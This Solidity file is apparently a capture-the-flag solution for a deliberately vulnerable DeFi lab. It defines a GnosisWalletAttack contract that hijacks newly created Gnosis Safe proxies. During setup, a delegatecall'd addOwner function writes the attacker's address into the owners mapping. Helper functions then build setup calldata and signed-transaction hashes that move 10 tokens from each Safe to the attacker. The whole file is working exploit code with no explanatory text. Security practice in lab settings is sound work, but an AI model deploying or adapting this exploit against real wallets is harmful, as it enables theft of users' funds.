pragma solidity 0.8.7;

import "@gnosis/contracts/GnosisSafe.sol";
import "@gnosis/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis/contracts/proxies/GnosisSafeProxy.sol";
import "../DamnValuableToken.sol";


contract GnosisWalletAttack is GnosisSafe {

    address[4] users;
    bytes4 public setupSelector = GnosisSafe.setup.selector;
    bytes4 public data = this.addOwner.selector;
    GnosisSafeProxyFactory public proxy;
    address masterCopy;
    address callBack;
    address public attackerAddress;
    constructor(address[] memory arr, address _proxy, address _master, address _callBack) {
        require(arr.length == 4, "Wrong number of addresses");
        for (uint i = 0; i < 4; i++) {
            users[i] = arr[i];
        }
        proxy = GnosisSafeProxyFactory(_proxy);
        masterCopy = _master;
        callBack = _callBack;
        attackerAddress = msg.sender;
    }
    //Function called in the gnosis safe setup to manipulate owner mapping
    function addOwner(address newOwner) public {
        owners[newOwner] = address(69);

    }
    //    Some helpers to make life easier
        function getInitialisationData(
        address[] calldata _owners,
        uint256 _threshold,
        address to)
         public view returns(bytes memory) {
            bytes memory _data = abi.encodeWithSelector(data, attackerAddress);
            address fallbackHandler = address(0);
            address paymentToken = address(0);
            uint256 payment = 0;
            return (abi.encodeWithSelector(setupSelector,
                _owners,
                _threshold,
                to,
                _data,
                fallbackHandler,
                paymentToken,
                payment,
                payable(address(0))));                  
        }
        function getInternalData() public view returns(bytes memory) {
            bytes memory internaldata = abi.encodeWithSignature("transfer(address,uint256)", attackerAddress, 10 ether);
            return internaldata;
        }
        function formulateTransaction(address _proxy, address token, uint _nonce) public returns(bytes32){
            bytes memory internaldata = abi.encodeWithSignature("transfer(address,uint256)", attackerAddress, 10 ether);
            bytes32 hash = ISafe(_proxy).getTransactionHash(token , 0, internaldata, 0, 0, 0, 0, address(0), attackerAddress, _nonce);
            return hash;
        }

        function getPreHash(address _proxy, address token, uint _nonce) public returns(bytes memory) {
            bytes memory internaldata = abi.encodeWithSignature("transfer(address,uint256)", attackerAddress, 10 ether);
            bytes memory hash = ISafe(_proxy).encodeTransactionData(token , 0, internaldata, 0, 0, 0, 0, address(0), attackerAddress, _nonce);
            return hash;
        }


}


interface ISafe {
        function getTransactionHash(
        address to,
        uint256 value,
        bytes calldata data,
        uint8 operation,
        uint256 safeTxGas,
        uint256 baseGas,
        uint256 gasPrice,
        address gasToken,
        address refundReceiver,
        uint256 _nonce
    ) external view returns (bytes32);

    function encodeTransactionData(
        address to,
        uint256 value,
        bytes calldata data,
        uint8 operation,
        uint256 safeTxGas,
        uint256 baseGas,
        uint256 gasPrice,
        address gasToken,
        address refundReceiver,
        uint256 _nonce
    ) external view returns (bytes memory);
}